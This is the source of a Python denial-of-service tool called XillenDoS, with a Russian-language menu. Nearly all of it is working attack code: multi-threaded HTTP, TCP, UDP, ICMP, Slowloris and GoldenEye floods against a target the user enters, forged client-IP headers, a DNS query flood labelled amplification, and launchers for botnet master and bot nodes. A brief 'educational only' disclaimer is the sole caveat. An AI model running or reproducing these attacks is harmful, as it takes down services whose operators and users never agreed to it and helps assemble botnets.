#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import threading
import socket
import dns.resolver
import ipaddress
import random
import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Back, Style
import logging
from datetime import datetime
import platform
import subprocess
import json

colorama.init()

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    UNDERLINE = Style.BRIGHT
    END = Style.RESET_ALL
    BG_RED = Back.RED
    BG_GREEN = Back.GREEN
    BG_YELLOW = Back.YELLOW

class AttackStats:
    def __init__(self):
        self.requests_sent = 0
        self.errors = 0
        self.successful_connections = 0
        self.bytes_sent = 0
        self.start_time = None
        self.running = False
        
    def reset(self):
        self.requests_sent = 0
        self.errors = 0
        self.successful_connections = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.running = True
        
    def get_rps(self):
        if not self.start_time:
            return 0
        elapsed = time.time() - self.start_time
        return self.requests_sent / max(elapsed, 1)

class XillenDoS:
    def __init__(self):
        self.target = None
        self.target_ip = None
        self.port = 80
        self.threads = 100
        self.duration = 60
        self.method = "http"
        self.running = False
        self.stats = AttackStats()
        self.setup_logging()
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('xillen_dos.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('XillenDoS')
    
    def resolve_domain(self, domain):
        try:
            result = dns.resolver.resolve(domain, 'A')
            return str(result[0])
        except:
            return None
    
    def is_valid_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except:
            return False
    
    def check_port_open(self, host, port, timeout=3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██╗  ██╗██╗██╗     ██╗     ███████╗███╗   ██╗            ║
║    ╚██╗██╔╝██║██║     ██║     ██╔════╝████╗  ██║            ║
║     ╚███╔╝ ██║██║     ██║     █████╗  ██╔██╗ ██║            ║
║     ██╔██╗ ██║██║     ██║     ██╔══╝  ██║╚██╗██║            ║
║    ██╔╝ ██╗██║███████╗███████╗███████╗██║ ╚████║            ║
║    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝            ║
║                                                              ║
║              ██████╗  ██████╗ ███████╗                      ║
║              ██╔══██╗██╔═══██╗██╔════╝                      ║
║              ██║  ██║██║   ██║███████╗                      ║
║              ██║  ██║██║   ██║╚════██║                      ║
║              ██████╔╝╚██████╔╝███████║                      ║
║              ╚═════╝  ╚═════╝ ╚══════╝                      ║
║                                                              ║
║           🔥 PYTHON POWER ENGINE 🔥                          ║
║                                                              ║
║  Author: t.me/Bengamin_Button | t.me/XillenAdapter          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(banner)
    
    def menu(self):
        print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}║                    XILLEN ATTACK METHODS                     ║{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}╠══════════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.CYAN}║ 🔥 DISTRIBUTED DDoS SYSTEM (МАКСИМАЛЬНАЯ МОЩНОСТЬ!) 🔥 ║{Colors.END}")
        print(f"{Colors.CYAN}║                                                              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 1. Master Node              - Запуск командного центра       ║{Colors.END}")
        print(f"{Colors.CYAN}║ 2. Bot Node                 - Подключение к ботнету          ║{Colors.END}")
        print(f"{Colors.CYAN}║ 3. Auto Deploy              - Автоматическое развертывание  ║{Colors.END}")
        print(f"{Colors.CYAN}║                                                              ║{Colors.END}")
        print(f"{Colors.CYAN}║ ⚡ SINGLE NODE DoS (Быстрые локальные атаки) ⚡            ║{Colors.END}")
        print(f"{Colors.CYAN}║                                                              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 4. HTTP Flood Attack        - Базовый HTTP флуд             ║{Colors.END}")
        print(f"{Colors.CYAN}║ 5. TCP Flood Attack         - Базовый TCP флуд              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 6. UDP Flood Attack         - Базовый UDP флуд              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 7. SYN Flood Attack         - SYN пакет флуд                ║{Colors.END}")
        print(f"{Colors.CYAN}║ 8. ICMP Flood Attack        - ICMP пакет флуд               ║{Colors.END}")
        print(f"{Colors.CYAN}║ 9. DNS Amplification        - DNS амплификация              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 10. Slowloris Attack        - Медленная HTTP атака          ║{Colors.END}")
        print(f"{Colors.CYAN}║ 11. GoldenEye Attack        - GoldenEye атака              ║{Colors.END}")
        print(f"{Colors.CYAN}║ 12. Mixed Attack            - Смешанная атака              ║{Colors.END}")
        print(f"{Colors.CYAN}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
    
    def get_target_info(self):
        print(f"\n{Colors.YELLOW}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}║                    Конфигурация Цели                          ║{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        while True:
            target_input = input(f"{Colors.GREEN}Введите цель (URL/IP/домен): {Colors.END}")
            if target_input:
                if target_input.startswith(('http://', 'https://')):
                    parsed = urlparse(target_input)
                    self.target = parsed.hostname
                    self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                else:
                    self.target = target_input
                    self.port = int(input(f"{Colors.GREEN}Введите порт (по умолчанию 80): {Colors.END}") or "80")
                
                print(f"{Colors.CYAN}Резолвинг домена...{Colors.END}")
                if self.is_valid_ip(self.target):
                    self.target_ip = self.target
                    self.logger.info(f"Цель: {self.target} (IP адрес)")
                else:
                    self.target_ip = self.resolve_domain(self.target)
                    if self.target_ip:
                        self.logger.info(f"Домен {self.target} резолвится в {self.target_ip}")
                    else:
                        self.logger.warning(f"Не удалось резолвить домен {self.target}")
                        self.target_ip = self.target
                
                print(f"{Colors.GREEN}Проверка доступности порта...{Colors.END}")
                if self.check_port_open(self.target_ip, self.port):
                    self.logger.info(f"Порт {self.port} открыт на {self.target_ip}")
                else:
                    self.logger.warning(f"Порт {self.port} закрыт или недоступен на {self.target_ip}")
                
                break
            else:
                print(f"{Colors.RED}Пожалуйста, введите корректную цель!{Colors.END}")

        self.threads = int(input(f"{Colors.GREEN}Количество потоков (по умолчанию 100): {Colors.END}") or "100")
        self.duration = int(input(f"{Colors.GREEN}Длительность атаки в секундах (по умолчанию 60): {Colors.END}") or "60")
    
    def http_flood_worker(self):
        while self.stats.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.port))
                
                path = random.choice(['/', '/index.html', '/api', '/admin', '/login'])
                user_agent = random.choice(self.user_agents)
                
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n"
                    f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Real-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n\r\n"
                )
                
                sock.send(request.encode())
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(request)
                self.stats.successful_connections += 1
                
                sock.close()
                
            except Exception as e:
                self.stats.errors += 1
    
    def tcp_flood_worker(self):
        while self.stats.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.port))
                
                data = b'A' * 1024
                sock.send(data)
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(data)
                self.stats.successful_connections += 1
                
                sock.close()
                
            except Exception as e:
                self.stats.errors += 1
    
    def udp_flood_worker(self):
        while self.stats.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                data = os.urandom(1024)
                sock.sendto(data, (self.target_ip, self.port))
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(data)
                
                sock.close()
                
            except Exception as e:
                self.stats.errors += 1
    
    def syn_flood_worker(self):
        while self.stats.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.port))
                
                data = b'SYN' * 100
                sock.send(data)
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(data)
                self.stats.successful_connections += 1
                
                sock.close()
                
            except Exception as e:
                self.stats.errors += 1
    
    def icmp_flood_worker(self):
        while self.stats.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                
                data = b'PING' * 100
                sock.sendto(data, (self.target_ip, 0))
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(data)
                
                sock.close()
                
            except Exception as e:
                self.stats.errors += 1
    
    def dns_amplification_worker(self):
        dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1']
        
        while self.stats.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                dns_server = random.choice(dns_servers)
                query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
                
                sock.sendto(query, (dns_server, 53))
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(query)
                
                sock.close()
                
            except Exception as e:
                self.stats.errors += 1
    
    def slowloris_worker(self):
        connections = []
        max_connections = 200
        
        while self.stats.running:
            try:
                if len(connections) < max_connections:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target_ip, self.port))
                    
                    request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(self.user_agents)}\r\n"
                    sock.send(request.encode())
                    connections.append(sock)
                    self.stats.requests_sent += 1
                    
                for sock in connections[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        time.sleep(random.uniform(5, 15))
                    except:
                        connections.remove(sock)
                        sock.close()
                        
            except Exception as e:
                self.stats.errors += 1
    
    def goldeneye_worker(self):
        while self.stats.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.port))
                
                path = random.choice(['/', '/index.html', '/api', '/admin'])
                user_agent = random.choice(self.user_agents)
                
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n"
                    f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Real-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Client-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Originating-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Remote-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Remote-Addr: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n\r\n"
                )
                
                sock.send(request.encode())
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(request)
                self.stats.successful_connections += 1
                
                sock.close()
                
            except Exception as e:
                self.stats.errors += 1
    
    def mixed_attack_worker(self):
        methods = [self.http_flood_worker, self.tcp_flood_worker, self.udp_flood_worker]
        method = random.choice(methods)
        method()
    
    def stats_monitor(self):
        start_time = time.time()
        while self.stats.running:
            elapsed = time.time() - start_time
            if elapsed >= self.duration:
                self.stats.running = False
                break
                
            print(f"\r{Colors.CYAN}Attack Progress: {Colors.YELLOW}{elapsed:.1f}s{Colors.CYAN}/{self.duration}s | "
                  f"{Colors.GREEN}Requests: {self.stats.requests_sent}{Colors.CYAN} | "
                  f"{Colors.RED}Errors: {self.stats.errors}{Colors.CYAN} | "
                  f"{Colors.MAGENTA}RPS: {self.stats.get_rps():.1f}{Colors.END}", end="")
            time.sleep(1)
    
    def start_attack(self, method):
        method_map = {
            4: self.http_flood_worker,
            5: self.tcp_flood_worker,
            6: self.udp_flood_worker,
            7: self.syn_flood_worker,
            8: self.icmp_flood_worker,
            9: self.dns_amplification_worker,
            10: self.slowloris_worker,
            11: self.goldeneye_worker,
            12: self.mixed_attack_worker
        }
        
        method_names = {
            4: "HTTP Flood",
            5: "TCP Flood",
            6: "UDP Flood",
            7: "SYN Flood",
            8: "ICMP Flood",
            9: "DNS Amplification",
            10: "Slowloris Attack",
            11: "GoldenEye Attack",
            12: "Mixed Attack"
        }
        
        print(f"\n{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}║                    Starting Attack                             ║{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        print(f"{Colors.YELLOW}Цель: {Colors.WHITE}{self.target}:{self.port}{Colors.END}")
        print(f"{Colors.YELLOW}IP адрес: {Colors.WHITE}{self.target_ip}{Colors.END}")
        print(f"{Colors.YELLOW}Метод: {Colors.WHITE}{method_names[method]}{Colors.END}")
        print(f"{Colors.YELLOW}Потоков: {Colors.WHITE}{self.threads}{Colors.END}")
        print(f"{Colors.YELLOW}Длительность: {Colors.WHITE}{self.duration}s{Colors.END}")
        print(f"{Colors.GREEN}Движок: {Colors.WHITE}Python (ВЫСОКАЯ СКОРОСТЬ!){Colors.END}")
        
        print(f"\n{Colors.RED}{Colors.BOLD}Нажмите Ctrl+C для остановки атаки{Colors.END}")
        time.sleep(2)
        
        self.stats.reset()
        
        stats_thread = threading.Thread(target=self.stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()
        
        worker_threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=method_map[method])
            thread.daemon = True
            thread.start()
            worker_threads.append(thread)
        
        try:
            while self.stats.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stats.running = False
            print(f"\n\n{Colors.RED}{Colors.BOLD}Атака остановлена пользователем!{Colors.END}")
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}Атака завершена!{Colors.END}")
        print(f"{Colors.CYAN}Всего запросов отправлено: {Colors.WHITE}{self.stats.requests_sent}{Colors.END}")
        print(f"{Colors.CYAN}Всего ошибок: {Colors.WHITE}{self.stats.errors}{Colors.END}")
        print(f"{Colors.CYAN}Успешных соединений: {Colors.WHITE}{self.stats.successful_connections}{Colors.END}")
        print(f"{Colors.CYAN}Байт отправлено: {Colors.WHITE}{self.stats.bytes_sent:,}{Colors.END}")
        print(f"{Colors.CYAN}Средний RPS: {Colors.WHITE}{self.stats.get_rps():.1f}{Colors.END}")
        
        self.logger.info(f"Атака завершена. Запросов: {self.stats.requests_sent}, Ошибок: {self.stats.errors}")
    
    def launch_master_node(self):
        print(f"\n{Colors.GREEN}🚀 Запуск Master Node (Командный центр)...{Colors.END}")
        print(f"{Colors.YELLOW}Master Node будет управлять всеми подключенными ботами{Colors.END}")
        
        try:
            master_script = os.path.join("distributed", "master_node.py")
            if os.path.exists(master_script):
                subprocess.Popen([sys.executable, master_script])
                print(f"{Colors.GREEN}✅ Master Node запущен!{Colors.END}")
                print(f"{Colors.CYAN}Порт команд: 1338{Colors.END}")
                print(f"{Colors.CYAN}Подключите боты к этому IP для координации атак{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Master Node скрипт не найден!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Ошибка запуска Master Node: {e}{Colors.END}")
    
    def launch_bot_node(self):
        print(f"\n{Colors.GREEN}🤖 Запуск Bot Node (Подключение к ботнету)...{Colors.END}")
        
        master_ip = input(f"{Colors.GREEN}Введите IP Master Node (по умолчанию 127.0.0.1): {Colors.END}") or "127.0.0.1"
        master_port = int(input(f"{Colors.GREEN}Введите порт Master Node (по умолчанию 1338): {Colors.END}") or "1338")
        
        try:
            bot_script = os.path.join("distributed", "bot_node.py")
            if os.path.exists(bot_script):
                print(f"{Colors.GREEN}✅ Подключение к Master Node {master_ip}:{master_port}...{Colors.END}")
                subprocess.Popen([sys.executable, bot_script, master_ip, str(master_port)])
                print(f"{Colors.GREEN}✅ Bot Node запущен и подключен!{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Bot Node скрипт не найден!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Ошибка запуска Bot Node: {e}{Colors.END}")
    
    def auto_deploy_system(self):
        print(f"\n{Colors.GREEN}🚀 Автоматическое развертывание DDoS системы...{Colors.END}")
        
        print(f"{Colors.YELLOW}Этот режим автоматически:")
        print(f"- Запустит Master Node")
        print(f"- Создаст несколько Bot Node")
        print(f"- Настроит координацию между ними{Colors.END}")
        
        confirm = input(f"\n{Colors.RED}Продолжить? (y/n): {Colors.END}")
        if confirm.lower() != 'y':
            return
            
        try:
            print(f"{Colors.GREEN}1. Запуск Master Node...{Colors.END}")
            self.launch_master_node()
            time.sleep(2)
            
            print(f"{Colors.GREEN}2. Запуск Bot Nodes...{Colors.END}")
            bot_count = int(input(f"{Colors.GREEN}Количество ботов для запуска (по умолчанию 3): {Colors.END}") or "3")
            
            for i in range(bot_count):
                print(f"{Colors.GREEN}Запуск Bot Node #{i+1}...{Colors.END}")
                self.launch_bot_node()
                time.sleep(1)
                
            print(f"{Colors.GREEN}✅ Система развернута!{Colors.END}")
            print(f"{Colors.CYAN}Master Node управляет {bot_count} ботами{Colors.END}")
            print(f"{Colors.CYAN}Используйте Master Node для координации атак{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}Ошибка развертывания: {e}{Colors.END}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.banner()
        
        print(f"{Colors.YELLOW}{Colors.BOLD}⚠️  ВНИМАНИЕ: Этот инструмент предназначен только для образовательных целей! ⚠️{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}Используйте только на системах, которыми вы владеете или имеете явное разрешение на тестирование.{Colors.END}")
        print(f"{Colors.YELLOW}{Colors.BOLD}Авторы не несут ответственности за неправомерное использование этого инструмента.{Colors.END}\n")
        
        print(f"{Colors.GREEN}🚀 Python движок активен - ВЫСОКАЯ ПРОИЗВОДИТЕЛЬНОСТЬ!{Colors.END}")
        
        input(f"{Colors.GREEN}Нажмите Enter для продолжения...{Colors.END}")
        
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            self.banner()
            self.menu()
            
            choice = input(f"\n{Colors.GREEN}Выберите метод атаки (1-12): {Colors.END}")
            
            if choice in ["1", "2", "3"]:
                if choice == "1":
                    self.launch_master_node()
                elif choice == "2":
                    self.launch_bot_node()
                elif choice == "3":
                    self.auto_deploy_system()
                    
                continue_choice = input(f"\n{Colors.GREEN}Вернуться в главное меню? (y/n): {Colors.END}")
                if continue_choice.lower() != 'y':
                    break
                    
            elif choice in ["4", "5", "6", "7", "8", "9", "10", "11", "12"]:
                method = int(choice)
                self.get_target_info()
                self.start_attack(method)
                
                continue_choice = input(f"\n{Colors.GREEN}Хотите запустить еще одну атаку? (y/n): {Colors.END}")
                if continue_choice.lower() != 'y':
                    break
            else:
                print(f"{Colors.RED}Неверный выбор! Пожалуйста, выберите 1-12.{Colors.END}")
                time.sleep(2)

def signal_handler(sig, frame):
    print(f"\n{Colors.RED}{Colors.BOLD}Выход...{Colors.END}")
    sys.exit(0)

if __name__ == "__main__":
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        tool = XillenDoS()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}{Colors.BOLD}До свидания!{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Ошибка: {e}{Colors.END}")
